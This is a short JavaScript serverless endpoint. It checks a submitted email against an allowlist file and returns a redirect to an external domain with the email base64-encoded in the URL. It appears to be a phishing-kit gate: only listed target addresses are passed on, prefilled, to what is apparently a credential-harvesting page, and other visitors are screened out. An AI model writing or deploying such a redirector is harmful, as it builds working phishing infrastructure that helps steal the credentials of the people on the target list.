import fs from "fs";
import path from "path";

// Cache the email list to avoid reading the file on every request
let allowedEmailsCache = null;

export default function handler(req, res) {
  // Only allow POST requests
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Method Not Allowed" });
  }

  try {
    // Load the email list into cache if not already loaded
    if (!allowedEmailsCache) {
      const filePath = path.resolve(process.cwd(), "api", "allowedEmails.json");
      allowedEmailsCache = JSON.parse(fs.readFileSync(filePath, "utf8"));
      console.log("Loaded allowed emails into cache.");
    }

    // Extract the email from the request body
    const { email } = req.body;

    // Validate the email
    if (allowedEmailsCache.includes(email)) {
      // Construct the redirect URL
      const baseURL = "https://api.abhaje.ma/ib0dad67430ee471dbc1f43f05587198d/?ny=";
      const encodedEmail = Buffer.from(email).toString("base64");
      const redirectURL = `${baseURL}${encodedEmail}`;

      return res.status(200).json({ success: true, redirectURL });
    } else {
      return res.status(403).json({ success: false, message: "Input valid email in Lowercase!" });
    }
  } catch (error) {
    console.error("Error processing the request:", error);
    return res.status(500).json({ success: false, message: "Server error" });
  }
}
